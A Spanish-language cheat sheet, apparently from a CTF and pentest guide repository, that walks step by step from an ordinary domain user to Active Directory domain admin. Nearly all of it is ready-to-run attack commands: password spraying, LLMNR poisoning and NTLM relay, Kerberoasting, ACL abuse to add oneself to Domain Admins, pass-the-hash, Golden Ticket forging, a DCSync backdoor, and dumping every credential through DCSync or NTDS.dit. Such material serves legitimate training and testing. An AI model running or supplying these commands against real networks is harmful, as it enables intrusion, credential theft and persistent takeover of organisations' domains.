# 🏢 Metodología de ataques a Active Directory

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
    █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██╔══██║██║  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██║  ██║██████╔╝   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         Guía paso a paso: de usuario a administrador del dominio
```

<p align="center">
  <img src="https://img.shields.io/badge/AD-Methodology-red?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/CTF-Guide-blue?style=for-the-badge" alt="CTF">
  <img src="https://img.shields.io/badge/Domain_Admin-green?style=for-the-badge" alt="DA">
</p>

---

## 🗺️ Resumen de la ruta de ataque

> **Términos:** DA significa administrador del dominio y TGT es un ticket de concesión de tickets de Kerberos. Skeleton Key designa una alteración de la autenticación en memoria del controlador de dominio; las demás técnicas se explican en sus fases correspondientes.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                       METODOLOGÍA DE ATAQUES A AD                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  FASE 1: Enumeración     FASE 2: Acceso inicial  FASE 3: Escalada       │
│  ├── Explorar la red     ├── Password spraying   ├── Kerberoast         │
│  ├── Enumerar LDAP       ├── Suplantación LLMNR  ├── AS-REP             │
│  ├── Enumerar usuarios   └── NTLM Relay          └── Explotar ACL       │
│  └── BloodHound                                                         │
│                                                                         │
│  FASE 4: Mov. lateral    FASE 5: Persistencia    FASE 6: Dominio        │
│  ├── Pass-the-Hash       ├── Golden Ticket       ├── DCSync             │
│  ├── WinRM/PSExec        ├── Silver Ticket       ├── NTDS.dit           │
│  └── Ejecución por WMI   └── Skeleton Key        └── Control total      │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 Índice

1. [Fase 1: enumeración](#-fase-1-enumeración)
2. [Fase 2: acceso inicial](#-fase-2-acceso-inicial)
3. [Fase 3: escalada de privilegios](#-fase-3-escalada-de-privilegios)
4. [Fase 4: movimiento lateral](#-fase-4-movimiento-lateral)
5. [Fase 5: persistencia](#-fase-5-persistencia)
6. [Fase 6: control del dominio](#-fase-6-control-del-dominio)
7. [Referencia rápida de comandos](#-referencia-rápida-de-comandos)

---

## 🔍 Fase 1: enumeración

### 1.1 Descubrimiento de la red

```bash
# Buscar controladores de dominio
nmap -p 53,88,389,636,445 10.10.10.0/24

# Identificar los servicios de AD
nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
```

**Puertos principales:**
| Puerto | Servicio | Finalidad |
|------|---------|---------|
| 53 | DNS | Resolución de nombres del dominio |
| 88 | Kerberos | Autenticación |
| 389 | LDAP | Directorio |
| 445 | SMB | Recursos compartidos de archivos |
| 636 | LDAPS | LDAP seguro |
| 5985 | WinRM | Administración remota |

### 1.2 Enumeración anónima (sin credenciales)

> **Alcance:** Las sesiones nulas y la lectura LDAP anónima dependen de los permisos y de la configuración del dominio; no están disponibles de forma universal.

```bash
# Sesión nula de RPC
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# Enlace anónimo de LDAP
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Enum4linux
enum4linux -a 10.10.10.10

# Enumeración de usuarios con Kerbrute (sin credenciales)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

### 1.3 Con credenciales válidas

```bash
# Obtener información del dominio
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u user -p password --groups
crackmapexec smb 10.10.10.10 -u user -p password --shares

# Enumeración de LDAP
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
```

### 1.4 Enumeración con PowerView

```powershell
# Importar PowerView
Import-Module .\PowerView.ps1

# Información del dominio
Get-Domain
Get-DomainController

# Buscar objetivos de interés
Get-DomainUser -SPN                    # Susceptible de Kerberoasting
Get-DomainUser -PreauthNotRequired      # Susceptible de AS-REP Roasting
Get-DomainComputer -Unconstrained       # Delegación

# Buscar sesiones de administradores del dominio (DA)
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

### 1.5 Recopilación con BloodHound

> **Compatibilidad:** El colector y el esquema deben corresponder a la edición de BloodHound. Los ejemplos conservan sintaxis y propiedades históricas; la consulta que combina relaciones alternativas no demuestra por sí sola todos los permisos necesarios para DCSync. Las líneas con `#` son etiquetas explicativas, no comentarios válidos de Cypher. Comprueba los derechos efectivos y la sintaxis de la edición instalada. Fuentes: [BloodHound.py](https://github.com/dirkjanm/BloodHound.py), [búsquedas Cypher](https://bloodhound.specterops.io/analyze-data/explore/cypher-search) y [derechos DCSync](https://bloodhound.specterops.io/resources/edges/dc-sync).

```bash
# Desde Linux (bloodhound-python)
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# Desde Windows (SharpHound)
.\SharpHound.exe -c All
```

**Consultas de BloodHound:**
```cypher
# Ruta más corta a administradores del dominio
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Usuarios susceptibles de Kerberoasting
MATCH (u:User {hasspn:true}) RETURN u.name

# Usuarios con derechos de DCSync
MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
```

---

## 🔑 Fase 2: acceso inicial

### 2.1 Password spraying (prueba de pocas contraseñas contra muchos usuarios)

```bash
# Password spraying con CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Password spraying con Kerbrute
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
```

**Contraseñas habituales:**
```
Estación+Año: Summer2024!, Winter2024
NombreEmpresa+123: Company123!
Welcome1, Password1
```

### 2.2 Suplantación de respuestas LLMNR/NBT-NS

```bash
# Terminal 1: iniciar Responder
sudo responder -I eth0 -wPv

# Esperar a que se capturen hashes...
# ¡Se ha capturado una respuesta NTLMv2!

# Terminal 2: recuperar la contraseña a partir del hash
hashcat -m 5600 hash.txt rockyou.txt
```

### 2.3 Retransmisión NTLM (NTLM Relay)

> **Aclaración del ejemplo:** La orden de Responder no desactiva por sí sola su servidor SMB; el comentario presupone una configuración previa. La retransmisión también depende de las protecciones y de los permisos del destino; la ausencia de firma SMB no garantiza el resultado. Véase el [proyecto oficial de Responder](https://github.com/lgandx/Responder).

```bash
# Buscar objetivos que no exijan firma SMB
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Responder (SMB desactivado)
sudo responder -I eth0

# Ataque de retransmisión
impacket-ntlmrelayx -tf relay.txt -smb2support
```

### 2.4 AS-REP Roasting (sin necesidad de contraseña)

> **Aclaración:** Este método requiere cuentas que no exijan preautenticación Kerberos. El archivo `asrep.txt` no se guarda explícitamente en las órdenes anteriores; el paso de recuperación presupone haber guardado la salida compatible. Véase el [script oficial GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py).

```bash
# Buscar usuarios vulnerables
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# O con credenciales
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Recuperar la contraseña
hashcat -m 18200 asrep.txt rockyou.txt
```

---

<a id="-fase-3-escalada-de-privilegios"></a>
## ⬆️ Fase 3: escalada de privilegios

### 3.1 Kerberoasting

> **Aclaración:** Kerberoasting obtiene tickets de servicio asociados a SPN para probar contraseñas sin conexión. El archivo `kerberoast.txt` no se crea con ese nombre en los pasos anteriores; Rubeus escribe `hashes.txt`. El modo 13100 del ejemplo corresponde a material Kerberos RC4, no a cualquier tipo de cifrado. Se conservan las órdenes originales.

```bash
# Desde Linux
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Desde Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Recuperar la contraseña
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### 3.2 Explotación de listas de control de acceso (ACL)

**GenericAll sobre un usuario:**
```powershell
# Cambiar la contraseña
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**GenericAll sobre un grupo:**
```powershell
# Añadirse al grupo
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**GenericWrite:**
```powershell
# Establecer un SPN para Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

**WriteDACL:**
```powershell
# Asignarse derechos de DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

### 3.3 Ataques contra la delegación

> **Requisitos:** Los ejemplos presuponen derechos de delegación o escritura concretos, cuentas delegables y servicios compatibles. En RBCD, crear una cuenta de equipo no concede por sí solo permiso para modificar el objeto objetivo. Los nombres de los archivos de tickets generados dependen de la herramienta y la versión; no siempre serán `administrator.ccache`.

**Delegación sin restricciones (Unconstrained Delegation):**
```powershell
# Buscar objetivos
Get-DomainComputer -Unconstrained

# Supervisar la llegada de TGT
.\Rubeus.exe monitor /interval:5 /targetuser:DC$

# Desencadenar la autenticación (PrinterBug)
SpoolSample.exe DC01 YOURHOST
```

**Delegación restringida (Constrained Delegation):**
```bash
# Solicitar un ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/serviceaccount:password -dc-ip 10.10.10.10

# Utilizar el ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

**Delegación restringida basada en recursos (RBCD):**
```bash
# Crear una cuenta de equipo
addcomputer.py -computer-name FAKE01 -computer-pass 'Password123!' domain.local/user:password

# Configurar RBCD
rbcd.py -delegate-from FAKE01 -delegate-to TARGET -action write domain.local/user:password

# Obtener un ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01:'Password123!'
```

---

<a id="-fase-4-movimiento-lateral"></a>
## ➡️ Fase 4: movimiento lateral

### 4.1 Autenticación con un hash (Pass-the-Hash)

```bash
# PSExec con un hash
impacket-psexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# WMIExec
impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# SMBExec
impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
```

### 4.2 Autenticación con un ticket (Pass-the-Ticket)

> **Aclaración:** La salida de Rubeus y una caché Kerberos de Linux no son formatos intercambiables sin más. El archivo `ticket.ccache` se presupone disponible en el formato correcto; la orden `dump` no lo crea automáticamente con ese nombre.

```bash
# Exportar un ticket
.\Rubeus.exe dump

# Utilizar el ticket (Linux)
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@target

# Utilizar el ticket (Windows)
.\Rubeus.exe ptt /ticket:base64ticket
```

### 4.3 WinRM

```bash
# Evil-WinRM con una contraseña
evil-winrm -i 10.10.10.10 -u admin -p password

# Con un hash
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH
```

### 4.4 Obtener un TGT con un hash (Overpass-the-Hash)

```bash
# Obtener un TGT con un hash
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Utilizar ahora Kerberos
dir \\server\share
```

---

## 🔒 Fase 5: persistencia

### 5.1 Golden Ticket (TGT falsificado)

```bash
# Se necesita: hash NTLM de krbtgt y SID del dominio

# Crear un ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# Utilizar
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### 5.2 Silver Ticket (ticket de servicio falsificado)

```bash
# Crear un ticket de servicio
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

### 5.3 Acceso persistente mediante derechos de DCSync

```powershell
# Añadir derechos de DCSync a cualquier usuario
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights DCSync
```

---

## 👑 Fase 6: control del dominio

### 6.1 DCSync

```bash
# Extraer todos los hashes
impacket-secretsdump domain.local/admin:password@10.10.10.10

# Con un hash
impacket-secretsdump -hashes :NTLMHASH domain.local/admin@10.10.10.10

# Usuario concreto
impacket-secretsdump domain.local/admin:password@10.10.10.10 -just-dc-user administrator
```

### 6.2 Extracción de NTDS.dit

```bash
# Crear una instantánea de volumen
vssadmin create shadow /for=C:

# Copiar NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Extraer sin conexión
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### 6.3 Extracción con CrackMapExec

```bash
# Extraer NTDS mediante DCSync
crackmapexec smb DC01 -u admin -p password --ntds
```

---

## 📊 Referencia rápida de comandos

### Enumeración con comandos de una línea

```bash
# Buscar controladores de dominio (DC)
nmap -p 88,389 --open 10.10.10.0/24

# Enumerar usuarios (sin credenciales)
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt

# Buscar cuentas susceptibles de AS-REP Roasting
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# Kerberoast
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
```

### Tabla de consulta de ataques

| Ataque | Comando |
|--------|---------|
| Password spraying | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
| AS-REP Roast | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
| Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
| DCSync | `secretsdump.py domain.local/admin:pass@DC` |
| Pass-the-Hash | `psexec.py -hashes :HASH domain.local/admin@target` |
| Golden Ticket | `ticketer.py -nthash KRBTGT -domain-sid SID -domain domain.local admin` |

### Recuperación de contraseñas a partir de hashes

> **Aclaración:** NTLMv2 en este contexto es una respuesta de autenticación capturada (NetNTLMv2), distinta del hash NT de una cuenta. Los modos Kerberos de la tabla corresponden a tipos de cifrado concretos; otros requieren modos diferentes.

| Tipo de hash | Modo de Hashcat |
|-----------|--------------|
| NTLM | `-m 1000` |
| NTLMv2 | `-m 5600` |
| Kerberoast | `-m 13100` |
| AS-REP | `-m 18200` |

---

## 🎯 Consejos para CTF

1. **Enumera siempre antes de actuar** - Evita atacar a ciegas
2. **Comprueba si es posible realizar AS-REP Roasting** - ¡Puedes obtener material para probar contraseñas sin credenciales!
3. **Ejecuta BloodHound** - Busca rutas de ataque
4. **Revisa las ACL** - A menudo están mal configuradas
5. **Busca configuraciones de delegación** - Pueden ofrecer vías de acceso directas
6. **Realiza el password spraying con cuidado** - ¡Las cuentas pueden bloquearse!
7. **Guarda todas las credenciales** - Las necesitarás después

---

## 📚 Guías de consulta relacionadas

- [BloodHound](../../BloodHound/translations/README.es.md)
- [Impacket](../../Impacket/translations/README.es.md)
- [CrackMapExec](../../CrackMapExec/translations/README.es.md)
- [Rubeus](../../Rubeus/translations/README.es.md)
- [PowerView](../../PowerView/translations/README.es.md)
- [Responder](../../Responder/translations/README.es.md)
- [Evil-WinRM](../../Evil-WinRM/translations/README.es.md)
- [Mimikatz](../../Mimikatz/translations/README.es.md)

---

<p align="center">
  <b>🏢 ¡De usuario a administrador del dominio!</b><br>
  <i>Sigue la metodología y toma el control del dominio</i>
</p>
